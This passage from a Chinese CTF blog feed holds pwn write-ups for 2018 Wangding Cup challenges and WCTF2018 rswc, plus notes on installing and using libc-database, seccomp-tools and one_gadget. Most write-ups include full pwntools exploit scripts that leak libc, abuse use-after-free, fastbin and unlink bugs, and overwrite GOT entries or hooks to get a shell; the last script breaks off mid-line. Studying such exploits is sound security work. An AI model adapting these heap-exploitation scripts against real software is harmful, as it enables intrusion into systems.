u64(heap.ljust(8,'\x00'))p.recvuntil("Age:")addr = int(p.recvline()[:-1],16)libc_base = addr - 3951480puts_addr = libc_base + 456336log.info('libc_base:%#x',libc_base)log.info('heap_addr:%#x',heap_addr)logout()#rewrite gotregist(p64(puts_got),0x20,22,"0gur333")login(p64(puts_addr))update(p64(libc_base+gadget[0])[:-2],23,"0gur222")p.interactive() pwn2pwn2还是挺简单的，存在数组越界漏洞，而且该数组还是在bss段上，因此可以泄露stderr的地址进而泄露libc地址；另外bss离got也很近，可以覆写got表。 附上脚本 1234567891011121314151617181920212223242526272829303132from pwn import *context.log_level='debug'debug = 1if debug: p = process('./pwn2') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')exit_got = 0x602060gadget =[0x45216,0x4526a,0xf02a4,0xf1147]gdb.attach(p,'b *0x4009a9')payload = 0x19 *'&lt;'+ '+.'+'&lt;+.'*7 + 0x40*'&lt;'+','+'&gt;,'*7p.recvuntil("Put the code: ")p.sendline(payload)stderr_addr = 0#leak libcfor i in range(0,8): c = ord(p.recv(1))-1 stderr_addr += c &lt;&lt; (7-i)*8log.info("stderr:%#x",stderr_addr)libc_base = stderr_addr - 3953984one_gadget = libc_base + gadget[0]#sys_addr = stderr_addr - 3670896log.info("one_gadget:%#x",one_gadget)for i in range(0,8): p.send(p64(one_gadget)[i])p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工具安装及使用]]></title>
    <url>%2F2018%2F08%2F30%2F%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[libc-database下载&amp;安装下载libc-database 1git clone https://github.com/niklasb/libc-database.git 下载各种版本的libc，存放在db目录下 12cd libc-database./get 使用12./find printf 670 puts ca0ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu10_i386) 这里670是要查询的libc中printf地址的后三位（十六进制），同理ca0是puts函数地址的后三位。 seccomp-tools安装1gem install seccomp-tools 使用目前只用到dump，查看沙箱保护允许使用的操作： 123456789101112131415161718$ seccomp-tools dump ./rswc line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x01 0x00 0xc000003e if (A == ARCH_X86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return KILL 0003: 0x20 0x00 0x00 0x00000000 A = sys_number 0004: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0006: 0x15 0x00 0x01 0x00000000 if (A != read) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0008: 0x15 0x00 0x01 0x00000001 if (A != write) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0012: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x06 0x00 0x00 0x00000000 return KILL 其他具体使用方法参考撰写工具的大佬：https://github.com/david942j/seccomp-tools one_gadget安装 安装ruby环境和管理工具 12sudo apt-get install rubysudo apt-get install gem 安装one_gadget 1sudo gem install one_gadget 使用直接使用”one_gadget 目标文件”在目标文件里查找system(“/bin/sh”)。找到之后对以下gadget偏移一一进行尝试。 12345678910111213141516$ one_gadget /lib/x86_64-linux-gnu/libc.so.60x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL]]></content>
  </entry>
  <entry>
    <title><![CDATA[2018网鼎杯第一场部分pwn]]></title>
    <url>%2F2018%2F08%2F30%2F2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA%E9%83%A8%E5%88%86pwn%2F</url>
    <content type="text"><![CDATA[好久没做题，手已经生了，这次比赛提醒自己不能懈怠= = Guess基本逻辑程序逻辑比较简单，每次比对flag时fork一个新的子进程进行比较。 再给自己讲一次fork函数：系统会先给新的子进程分配资源，然后从父进程中将各个数据复制到新的进程中。虽然在gdb中调试查看父进程和子进程的同一个变量是在同一个地址，但是实际上的物理地址是不同的，它们的资源是独立的，操作父进程中的变量不会影响子进程，如题目中的v7。fork之后，对于子进程会返回0，对于父进程返回的是子进程的PID，因此在上述逻辑中，对于父进程，会执行v7++，并停等在wait处，直到子进程返回；对于子进程，break跳出循环后进行比对，比对结束后子进程退出。 漏洞分析程序中使用了gets函数，典型的缓冲区溢出函数。但是checksec，程序开启了canary保护： 在ctf-wiki中提到，当canary的值被修改后，程序就会执行__stack_chk_fail函数来打印argv[0]指针所指向的字符串，一般情况下都是程序名。 123456789101112131415161718// debug/stack_chk_fail.cvoid__attribute__ ((noreturn))__stack_chk_fail (void)&#123; __fortify_fail ("stack smashing detected");&#125;// debug/fortify_fail.cvoid__attribute__ ((noreturn)) internal_function__fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "&lt;unknown&gt;");&#125; 尝试输入超过0x40个字节，并在__fortify_fail处设置断点，查看__libc_message的参数： 此时argv[0]中的字符串为程序名，继续执行，就会打印结果： 因此，当我们能够覆盖argv[0]为存放flag的buf地址，就能通过canary机制将内容读出。而且每次canary被修改之后，只是子进程退出，而父进程仍在正常执行。 漏洞利用漏洞利用的思路为将argv[0]的地址覆盖为buf地址。由于buf为栈上的地址，因此首先需要泄露栈地址。在libc中有一个environ变量，它记录了程序的环境变量，而环境变量是存放在栈上的，可以通过读取这个值泄露栈上的地址。但在此之前，需要泄露libc的地址。 泄露libc地址将argv[0]覆写为puts@got的地址泄露puts函数地址。 查看执行gets前后的栈结构，发现有一个变量用于存放argv[0]： 计算S2和这个地址之间的偏移并填充，即可覆盖这一地址中的内容为puts@got的地址，canary保护就会输出puts函数的地址。 本题没有给出libc，可以使用libc-database来确定使用的是哪一版本的libc。 确定后通过相对偏移计算出environ变量的地址。 泄露栈地址在第二次覆写时，将0x7fffffffdf68处覆写为environ的地址，读出栈地址，通过偏移计算出buf地址。 读取flag第三次覆写时，将0x7fffffffdf68处覆写为buf地址，读出flag 利用脚本123456789101112131415161718192021222324252627282930313233from pwn import *context.log_level = 'debug'debug = 0if debug: p = process('./GUESS') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote('106.75.90.160',9999) libc = ELF('./libc-database/db/libc6_2.23-0ubuntu10_amd64.so')puts_got = 0x602020payload = 'a'*296 + p64(puts_got)p.sendlineafter("Please type your guessing flag\n",payload)p.recvuntil("*** stack smashing detected ***: ")puts_addr = u64(p.recv(6).ljust(8,'\0'))log.info("puts_addr:%#x",puts_addr)#gdb.attach(p,'b *0x400b23')environ_addr = puts_addr - (libc.symbols['puts']-libc.symbols['environ'])payload = 'a'*296 + p64(environ_addr)p.sendlineafter("Please type your guessing flag\n",payload)p.recvuntil("*** stack smashing detected ***: ")environ = u64(p.recv(6).ljust(8,'\0'))log.info("environ:%#x",environ)offset = 248rbp = environ - offsetbuf_addr = rbp-0x70payload = 'a'*296 + p64(buf_addr)p.sendlineafter("Please type your guessing flag\n",payload)p.interactive() blind顾名思义，blind的含义就是看不见输出，之前也遇到过同样类型的silent（强网杯），但是本题开了更多的保护机制。 基本逻辑程序主要有三个功能：add、change和release add用于添加一个0x68大小的块，向其中写入内容，同时更新ptr数组。ptr数组存放各个块的地址。 change修改块中的内容。 release释放指定的块，并更新free_time，此处限制了release函数使用的次数。 另外在add和change都用到了一个read_str函数，当遇到\n或输入长度达到限制时，会向当前位置写入一个0 漏洞分析在release函数中free后的指针没有置零，存在UAF漏洞。同时本程序还开启了RELRO保护，不能对GOT表进行修改。 可以通过UAF漏洞构造出fastbin attack一样的条件，即修改已释放的fastbin的FD指针指向一个伪造的块，当再次分配时，伪造的块就被分配出去。 本程序中bss段是可写的，且已经提供现成的system(‘/bin/sh’)，考虑将malloc_hook修改为system函数地址。而malloc_hook离main_arena很近，考虑在ptr数组中伪造一个指针指向main_arena。我们知道，当有一个0x100大小的块被释放时，会被放入unsortedbin，此时FD和BK都会被写成main_arena+88，如果能够伪造一个0x100的块并释放，就能够实现在ptr数组中写入main_arena+88。 漏洞利用为了能向malloc_hook中写入system，需要在ptr数组中伪造一个指向0x100大小块的指针，也就是要实现覆写功能。利用UAF能够修改已释放块的FD指针，让FD指向bss段上stderr-5前后的位置，这里能够保证size处正好对应0x7f，能够绕过free函数的检查。这一块分配出去后，能够向bss段写入0x68个字节，覆盖掉ptr中的内容，顺便覆盖掉free_time。 覆写的时候，从ptr[0]开始伪造fake_chunk，ptr[1]处写入块的大小0x101，ptr[4]位置写入ptr[2]，即ptr[4]控制的块指向ptr[2]处。 覆写完成后，考虑释放掉ptr[4]，但此处需要注意free函数有一些检查（我踩的坑）： __int_free会在释放之前会首先检查释放的chunk是否是16对齐的:misaligend_chunk(p)，不是的话会报错。如果是释放ptr[1]、ptr[3]……这类结尾是0x8的地址就会报错。 12345678static void_int_free (mstate av, mchunkptr p, int have_lock)&#123; ……if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) ……&#125; 考虑到合并的问题，__int_free也会检查释放块是否使用中（即下一块的inuse位是否为1）、释放块的前一块是否使用中（即当前块的inuse是否为1）、释放块的下一块是否在使用中（下一块的下一块 inuse是否为1）。此题为了避免合并，将代表size的ptr[3]末尾置1，并伪造下一块的下一块inuse为1，同时为了确定不是double free，将下一块的inuse位末尾置一。 考虑到上述因素，需要在fake_chunk之后的0x100出写下inuse位1，代表fake_chunk正在使用,同时设置该块大小为0x20；在fake_chunk+0x100+0x20处写下inuse位1，代表fake_chunk的下一块正在使用，不会合并。因此在ptr[3]中写入ptr+0x100的地址，ptr[5]中写入ptr+0x120的地址。 一切准备就绪后，可以释放ptr[4]，ptr[2]处就会写入FD值，即main_arena+88。由于read_str函数在收到\n时会写入一个0，可以change第0块，只输入一个\n，那么ptr[2]中就由main_arena+88(0x7ffff7dd1b70)变成0x7ffff7dd1b00，这个地址正好就是malloc_hook-0x10，此时再change第四块，就能向malloc_hook写入system了。 填充的bss如下： 释放ptr[4]后的bss如下： 利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *context.log_level = 'debug'debug = 1if debug: p = process('./blind')else: p = remote('106.75.20.44',9999)bss_addr = 0x60203dptr_addr = 0x602060sys_addr = 0x4008e3fini_addr = 0x601db8def add(idx,content): p.sendlineafter("Choice:",'1') p.sendlineafter("Index:",str(idx)) p.sendlineafter("Content:",content)def change(idx,content): p.sendlineafter("Choice:",'2') p.sendlineafter("Index:",str(idx)) p.sendlineafter("Content:",content)def release(idx): p.sendlineafter("Choice:",'3') p.sendlineafter("Index:",str(idx))add(0,'0gur1')add(1,'1gur1')release(0)release(1)change(0,p64(bss_addr))add(2,'2gur1')#2-&gt;1add(3,'3gur1')#3-&gt;0fake_chunk = p64(0xdeadbeef)+p64(0x101)fake_chunk += p64(0)+p64(ptr_addr+0x100)payload = 'a'*(ptr_addr-bss_addr-16)+fake_chunk+p64(ptr_addr+0x10)+p64(ptr_addr+0x120)add(4,payload)#4-&gt;bss_addrchange(3,p64(0xdeadbeef)+p64(0x21))change(5,p64(0xdeadbeef)+p64(0x21))#gdb.attach(p,'b *0x400c94')release(4)change(4,'')#raw_input()change(2,'a'*0x10+p64(sys_addr))change(4,p64(0))p.sendlineafter("Choice:",'1')p.sendlineafter("Index:",'2')p.interactive() babyheapbabyheap和blind两道题很像，限制条件不同。 基本逻辑babyheap和blind的逻辑类似，不同的是babyheap添加了输出函数show，限制了change的次数，解除了release的次数限制，同时给content分配的块大小由0x68变成了0x20，ptr数组中的块数增加到了10块。 漏洞分析同样，babyheap中的release函数也没有对free掉的指针置零，存在UAF漏洞和double free漏洞。本题没有给system函数，先对libc进行泄露，再覆写free_hook为system。 libc的泄露和free_hook的改写都要需要对ptr数组进行修改，然后通过show和change函数完成泄露和改写。如何能对ptr数组改写呢？由于本题的块大小已被修改为0x20，即chunk size处为0x30，已不能使用blind中的方法。为了能对ptr进行覆写，可以伪造一个chunk，构造FD和BK，通过free触发unlink实现。 漏洞利用unlink实现ptr数组的覆写当要free一个0x90的块时，如果它的前一块是一个空闲块时，会先对前一块进行unlink，然后再把这两块合并。因此，我们需要一个chunk size为0x90且inuse位已经置零的chunk，以及空闲的上一块。 实际上，题目中是存在堆溢出漏洞的，可以利用这个漏洞修改某个块的chunk size字段。堆溢出漏洞如下：如果在已分配的content部分构造一个chunk size为0x30的fastbin，就能通过fastbin attack修改FD指针为这个chunk size，再次分配的块就指向了这个chunk+0x10处，在读入0x20个字节时，就会覆盖掉下一块的chunk size字段。 另外由于存在UAF漏洞，在fastbin attack中也能顺便泄露堆地址。 接下来，把content0构造成空闲的上一块，写入FD和BK指针。这里就是unlink的套路了，FD和BK分别写入ptr[0]-0x18和ptr[0]-0x10，在unlink时先检查 FD-&gt;bk==BK-&gt;fd==P，其中P为要释放的地址，即：*(ptr[0]-0x18+0x18) == *(ptr[0]-0x10+0x10) ==*(ptr[0])，接着是unlink的FD-&gt;bk=BK，BK-&gt;fd=FD，即： *(ptr[0]-0x18+0x18)=ptr[0]-0x10，*(ptr[0]-0x10+0x10)=ptr[0]-0x18，最终*(ptr[0])=ptr[0]-0x18，即ptr[0]中写入的是ptr[0]-0x18。 free时同blind一样，要注意inuse位的问题，上一块已经标注为空闲了；当前块的inuse位由下一块控制，地址为content2+0x90，可以事先申请好content3、content4、content5，这样content5就代表着content2的下一块，已经分配的content5 inuse位一定为1；下一块的inuse位由top控制，肯定为1。 至此，就能实现对ptr的覆写：change第0块相当于向ptr[0]-0x18写入内容，能够覆盖ptr[0]中的值为ptr[8]，再change第0块相当于向ptr[8]中写入内容，能够覆写ptr[8]，ptr[9]和edit_time。 泄露libc地址&amp;覆写free_hook在上一步的ptr[8]中写入free@got地址，show第8块即可泄露libc地址。 在上一步的ptr[9]中写入ptr[0]地址，泄露libc地址之后，向ptr[9]中写入free_hook的地址，即ptr[0]中为free_hook地址，再change第0块，写入one_gadget。 利用脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *context.log_level = 'debug'debug = 1if debug: p = process('./babyheap') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote('106.75.20.44',9999) libc = ELF('./libc.so.6')ptr_addr = 0x602060free_got = 0x601f98gadget =[0x45216,0x4526a,0xf02a4,0xf1147]def add(idx,content): p.sendlineafter("Choice:",'1') p.sendlineafter("Index:",str(idx)) p.sendlineafter("Content:",content)def change(idx,content): p.sendlineafter("Choice:",'2') p.sendlineafter("Index:",str(idx)) p.sendlineafter("Content:",content)def show(idx): p.sendlineafter("Choice:",'3') p.sendlineafter("Index:",str(idx))def release(idx): p.sendlineafter("Choice:",'4') p.sendlineafter("Index:",str(idx))add(0,p64(0xdeadbeef)+p64(0x51)+p64(ptr_addr-0x18)+p64(ptr_addr-0x10)[:-1])add(1, p64(0xdeadbeef)+p64(0x31))add(2,'2gur1')add(3,'3gur1')add(4,'4gur1')add(5,'5gur1')release(3)release(2)release(3)#gdb.attach(p,'b *0x400d71\nc\nn\nx/8gx 0x602060')show(3)heap_addr = u64(p.recvuntil('\n')[:-1].ljust(8,'\0'))log.info('heap_addr:%#x',heap_addr)add(6,p64(heap_addr-0x20))#6-&gt;3add(7,'7gur1')#7-&gt;2add(8,'8gur1')#8-&gt;3payload = 'a'*16+p64(0x50)+p64(0x90)[:-1]add(9,payload)release(2)#gdb.attach(p)change(0,'a'*24+p64(ptr_addr+0x40)[:-1])change(0,p64(free_got)+p64(ptr_addr)+p64(0xffffffff))show(8)free_addr = u64(p.recvuntil('\n')[:-1].ljust(8,'\0'))free_hook = free_addr - libc.symbols['free']+libc.symbols['__free_hook']one_gadget = free_addr - libc.symbols['free']+ gadget[3]change(9,p64(free_hook))change(0,p64(one_gadget))release(4)p.interactive() EasyCoin基本逻辑程序实现了用户的注册和登录功能，在登录后能够发起交易。 regist函数构建一个新的块，包含用户名、密码、总金额和交易列表。 123456struct user&#123; char name[32]; char pwd[32]; int total=1000000000; char *deal_list=NULL;&#125; login函数比对用户名和密码。 display函数较简单，展示用户的基本信息。 send_coin发送硬币，先在接收方的deal_list中追加结点，再在当前用户的deal_list追加结点。 1234567struct deal&#123; struct deal * next; char * other;//sendor or receiver int id; bool flag;//0 for send money，1 for receive money int money;&#125; display_trans展示用户的交易信息，简单的读取deal_list。 change_pwd修改用户密码。 dele_user删除当前用户，释放name，pwd的空间，并沿着deal_list依次删除其他用户中包含与当前用户交易的deal，再删除deal_list中的deal，最终释放user的空间。 dele_deal是用于在交易另一方的deal_list中照当与当前用户的交易并删除。 漏洞分析漏洞一：在main函数中，第二个switch中的default，存在格式化字符串漏洞，可用于泄露地址。 漏洞二：在dele_user函数中，虽然释放了deal_list中的deal，但并没有修改deal_list的指向，仍然能通过user-&gt;deal_list访问到已经释放的块。另外，send_coin时能向自己发送金币，即deal_list可以有sendor和receiver都是自己的deal，在这种情况下，删除当前用户，dele_user就会通过deal-&gt;other信息找到自己，如果这笔交易之前有其他已经释放的交易，那么就会把已释放的FD当做next字段查找一下个deal，而FD的值相对于真正的内容相差16字节，利用这一点点偏移能够伪造假的next字段，指向我们可控的块。 漏洞利用泄露地址格式化字符串泄露libc地址和堆地址。 在调用printf(&amp;buf)时，观察各寄存器和栈结构，发现rcx中的值位于libc中，栈中的第四个参数是堆地址 在buf中写入%3$p和%9$p能够获取相关信息。 覆写free地址为system地址为user1构造一个正常的交易和一个发送给自己的交易，如下： 当删除user1时，会首先处理第一个与user2的正常交易，在程序逻辑中，user1的id为0的deal块（简称user1_0）和user2的id为0的deal块（简称user2_0）是一前一后创造的，这两块是挨在一起的。释放的时候会先释放user2_0，再释放user1_0，因此释放后，user1_0的FD指针指向user2_0。即user1_0的next指针被修改为user2_0。 接下来处理user1_1，由于这里的other仍是user1，就会沿着user1的deal_list查找，而user1_0的FD已经被修改成user2_0了，会把user2_0的previous size字段当做next处理，这个字段又恰好是user1_0的money字段。我们可以在此处把money指向user2_pwd处。user2_pwd是我们可控的，在这里伪造一个deal结构，并使id对应位置为1，这样就会释放user2_pwd。 删除完user1后，fastbin中的结构如下： 1user1_name&lt;-user1_pwd&lt;-user2_0&lt;-user1_0&lt;-user2_pwd&lt;-user1_1&lt;-user1_1&lt;-user1 通过修改user2的密码，修改fastbin中user2_pwd的下一块，这里将user2_pwd的FD修改为user3_pwd，这样在发起两次交易（与user）之后，注册新用户，就会分配到user3_pwd这块。 12user3_pwd&lt;-user2_pwd&lt;-user1_1&lt;-user1_1&lt;-user1user4 user3_2 user2_2 user3_1 user2_1 此时，修改user3的密码，就相当于修改user4的块，通过这一操作将user4-&gt;pwd修改为free@got，再通过修改user4的密码，向free@got中写入system地址。 整体的堆和fastbin结构如下： 利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from pwn import *context.log_level='debug'p = process('./EasyCoin')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def regist(name,pwd,pwd1): p.sendlineafter("&gt; ",'1') p.sendlineafter("Please input username\n&gt; ",name) p.sendlineafter("Please input password\n&gt; ",pwd) p.sendlineafter("Verify input password\n&gt; ",pwd1)def login(name,pwd): p.sendlineafter("&gt; ",'2') p.sendlineafter("Please input username\n&gt; ",name) p.sendlineafter("Please input password\n&gt; ",pwd)def display(): p.sendlineafter("&gt; ",'1')def sendcoin(name,money): p.sendlineafter("&gt; ",'2') p.sendlineafter("What user do you send to?\n&gt; ",name) p.sendlineafter("Hom many?\n&gt; ",money)def change_pwd(pwd): p.sendlineafter("&gt; ",'4') p.sendlineafter("Please input password\n&gt; ",pwd)def dele(): p.sendlineafter("&gt; ",'5')def logout(): p.sendlineafter("&gt; ",'6')ptr= 0x603100free_got = 0x603018pwd2=p64(0)+p64(0xdeadbeef)+p64(1)regist("0gur1","123","123")regist("0gur2",pwd2,pwd2)regist("/bin/sh","","")login("0gur2",pwd2)#leak libcp.sendafter("&gt; ",'%3$p')p.recvuntil("[-] Unknown Command: ")addr = int(p.recv(14),16)sys_addr = addr - 728880free_addr = sys_addr - (libc.symbols['system']-libc.symbols['free'])log.info('sys_addr:%#x',sys_addr)log.info('free_addr:%#x',free_addr)#gdb.attach(p,"b *0x401717")p.sendafter("&gt; ",'%9$p')p.recvuntil("[-] Unknown Command: ")heap_addr = int(p.recvuntil('\x7f')[:-2],16)-0xa0log.info('heap_addr:%#x',heap_addr)sendcoin("0gur1",str(heap_addr+0x100))logout()#0gur1login("0gur1","123")sendcoin("0gur1",'12')dele()#0gur2pwd2 = p64(heap_addr+0x1b0)+p64(0xdeadbeef)+p64(1)login("0gur2",pwd2)change_pwd(p64(heap_addr+0x180))sendcoin("/bin/sh","12")sendcoin("/bin/sh","12")logout()regist("0gur3","123","123")#binshlogin("/bin/sh",p64(heap_addr+0x280))change_pwd(p64(heap_addr+0x280)+p64(free_got))logout()#0gur3#gdb.attach(p)login("0gur3",p64(free_addr))change_pwd(p64(sys_addr))logout()#binshlogin("/bin/sh",p64(heap_addr+0x280))dele()p.interactive() 另一种方法PS：写blog的过程中想到另外一种简单一点的方式，不用在fastbin中修改user2_pwd的FD指针，把user2_pwd分配给一个新的user，和上述同理，也是通过操作新user的pwd来写入system地址。 12……user2_pwd&lt;-user1_1 &lt;-user1_1 &lt;-user1 user5 user4_pwd user4_name user4 对应的利用脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *context.log_level='debug'p = process('./EasyCoin')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def regist(name,pwd,pwd1): p.sendlineafter("&gt; ",'1') p.sendlineafter("Please input username\n&gt; ",name) p.sendlineafter("Please input password\n&gt; ",pwd) p.sendlineafter("Verify input password\n&gt; ",pwd1)def login(name,pwd): p.sendlineafter("&gt; ",'2') p.sendlineafter("Please input username\n&gt; ",name) p.sendlineafter("Please input password\n&gt; ",pwd)def display(): p.sendlineafter("&gt; ",'1')def sendcoin(name,money): p.sendlineafter("&gt; ",'2') p.sendlineafter("What user do you send to?\n&gt; ",name) p.sendlineafter("Hom many?\n&gt; ",money)def change_pwd(pwd): p.sendlineafter("&gt; ",'4') p.sendlineafter("Please input password\n&gt; ",pwd)def dele(): p.sendlineafter("&gt; ",'5')def logout(): p.sendlineafter("&gt; ",'6')ptr= 0x603100free_got = 0x603018pwd2=p64(0)+p64(0xdeadbeef)+p64(1)regist("0gur1","123","123")#user1regist("0gur2",pwd2,pwd2)#user2regist("/bin/sh","","")#user3login("0gur2",pwd2)#leak libcp.sendafter("&gt; ",'%3$p')p.recvuntil("[-] Unknown Command: ")addr = int(p.recv(14),16)sys_addr = addr - 728880free_addr = sys_addr - (libc.symbols['system']-libc.symbols['free'])log.info('sys_addr:%#x',sys_addr)log.info('free_addr:%#x',free_addr)p.sendafter("&gt; ",'%9$p')p.recvuntil("[-] Unknown Command: ")heap_addr = int(p.recvuntil('\x7f')[:-2],16)-0xa0log.info('heap_addr:%#x',heap_addr)sendcoin("0gur1",str(heap_addr+0x100))logout()#0gur1login("0gur1","123")sendcoin("0gur1",'12')dele()regist("0gur3","123","123")#user4regist("0gur4","123","123")#user5#0gur2pwd2 = p64(heap_addr+0x1c0)#+p64(heap_addr+0x70)+p64(1)#gdb.attach(p,"b *0x400e51")login("0gur2",pwd2)change_pwd(p64(heap_addr+0x1c0)+p64(free_got))logout()#0gur4login("0gur4",p64(free_addr))change_pwd(p64(sys_addr))logout()login("/bin/sh","")dele()p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WCTF2018-rswc]]></title>
    <url>%2F2018%2F07%2F11%2FWCTF2018-rswc%2F</url>
    <content type="text"><![CDATA[基本逻辑这一题也是典型的菜单类题目，共有5个功能： 123450. alloc1. edit2. show3. delete9. exit prepare函数模拟了堆初始化的过程。 其中mmap函数的原型如下： 1void* mmap(void* start,size_t length,int prot,int flags,int fd,off_t offset); 第三个参数prot表示保护方式： 12345#define PROT_READ 0x1 /* page can be read */#define PROT_WRITE 0x2 /* page can be written */#define PROT_EXEC 0x4 /* page can be executed */#define PROT_SEM 0x8 /* page may be used for atomic ops */#define PROT_NONE 0x0 /* page can not be accessed */ 第6行的mmap分配了一块0x1000大小的内存，且不可读、写以及执行，用于对堆的保护。 第11行分配了类似于arena的区域，存放指针，权限为rw。 接着初始化heap的函数init__() 先分配了0x3000内存作为heap，然后再arena中记录heap地址、top地址、heap大小以及已经分配的chunk数量。然后对arena进行了初始化。 alloc函数用于分配新的chunk，关键函数是malloc_memory() malloc_memory函数首先计算chunk实际的大小，完成对齐的功能。然后检查arena中记录的chunk中有没有处于空闲状态并且大于需求大小的，如果有，就分配该chunk；否则就在top中分配一块。 此处可以确定arena的结构： 返回到alloc函数后，对新分配的chunk进行初始化，并更新记录第一块的指针first edit函数用于编辑chunk中的content，输入idx，通过每个chunk的下一地址字段找到下一块。 show函数展示chunk的size、content dele函数修改下一块地址字段，并将arena中对应的chunk的inuse位置零。 漏洞分析arena分配的大小为0x1000，除去前面32字节的信息字段，一共可以存放254个chunk信息；而heap分配了0x3000，如果按照最小的块32字节大小来分配，一共可以分配0x3000/0x20=384个chunk。因而在分配第255个chunk时，arena就会溢出，但由于arena的下一块是rwx都不可操作的保护区域，这个溢出无法利用。 看出题人的题解，提到了Linux内核中的ulimit和mmap的关系。 123456789101112131415void arch_pick_mmap_layout(struct mm_struct *mm)&#123; unsigned long random_factor = 0UL; if (current-&gt;flags &amp; PF_RANDOMIZE) random_factor = arch_mmap_rnd(); if (mmap_is_legacy()) &#123; mm-&gt;mmap_base = TASK_UNMAPPED_BASE + random_factor; mm-&gt;get_unmapped_area = arch_get_unmapped_area; &#125; else &#123; mm-&gt;mmap_base = mmap_base(random_factor); mm-&gt;get_unmapped_area = arch_get_unmapped_area_topdown; &#125;&#125; 当mmap_is_legacy返回1时（旧版），mmap从低地址向高地址增长；当返回0时（新版），mmap从高地址向低地址增长。 1234567891011static int mmap_is_legacy(void)&#123; //若设置了ADDR_COMPAT_LAYOUT属性，则提供旧版的虚拟地址空间内存 if (current-&gt;personality &amp; ADDR_COMPAT_LAYOUT) return 1; //判断堆栈大小是否为无限制的 if (rlimit(RLIMIT_STACK) == RLIM_INFINITY) return 1; //sysctl_legacy_va_layout可以在/proc/sys/vm/legacy_va_layout中查看 return sysctl_legacy_va_layout;&#125; Linux中的ulimit -s命令能够限制进程使用的堆栈大小，当-s的参数为unlimited时，则是对大小不做限制。也就是说，如果在运行程序之前执行该命令，在执行mmap时，就会进入到第二个条件分支，mmap_is_legacy就会返回1。 先看正常情况下，mmap的分配情况。先分配的arena的地址是0x7ffff7ff5000，后分配的heap地址为0x7ffff7ff2000，即当前情况下，mmap是由高地址向低地址增长的，mmap_is_legacy返回的为0。 通过vmmap也能看出mmap的增长方向，最先分配的rwx都不可操作的保护区域，地址在最下面。 而此时的sysctl_legacy_va_layout的值为0，即使用新版的映射方式从高到低增长。 接下来执行ulimit -s unlimited，再次运行程序，查看内存。此时先分配的arena地址比后分配的heap地址更小了，即mmap变成了由低地址向高地址增长。 在vmmap中，两块区域的位置也发生了变化。 此时就可以利用arena的溢出来覆写heap区域来达成目标了。 还有一点是，本题开启了沙箱保护，只允许进行open、read、write、exit和exit_group操作，也就是不能直接获取shell，但是可以直接读写flag文件来获取flag。 漏洞利用分配254个以上的chunk造成arena的溢出。利用arena中chunk info的size字段覆盖heap中chunk的size字段，edit时会造成chunk的content溢出，覆写下一个chunk的”下一地址“（简称next）字段，进而利用show泄露和edit覆写got中函数地址。 将atoi函数覆写为gets函数，造成栈溢出，进而构造ROP劫持程序执行流。 利用脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *import timecontext.log_level='debug'p = process('./rswc')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')def alloc(size): p.recvuntil('&gt; ') p.sendline('0') p.recvuntil('size: ') p.sendline(str(size))def edit(idx,content): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('index: ') p.sendline(str(idx)) p.recvuntil('content: ') p.sendline(content)def show(idx): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('index: ') p.sendline(str(idx))def dele(idx): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil('index: ') p.sendline(str(idx))#normal block:0~253for i in range(0,254): alloc(16)#no.254 will cover the first chunkalloc(256)#overwrite no.253's ptratoi_got = 0x602068edit(254,'0gur1'.ljust(16,'x')+p64(atoi_got-16))#leak addressshow(254)p.recvuntil(' content: ')atoi_addr = u64(p.recv(6)+'\x00\x00')open_addr = atoi_addr - (libc.symbols['atoi']-libc.symbols['open'])read_addr = atoi_addr - (libc.symbols['atoi']-libc.symbols['read'])gets_addr = atoi_addr - (libc.symbols['atoi']-libc.symbols['gets'])write_addr = atoi_addr - (libc.symbols['atoi']-libc.symbols['write'])log.info('atoi_addr:%#x' %atoi_addr)#overwrite atoi_got with getsedit(254,p64(gets_addr))libc_base = 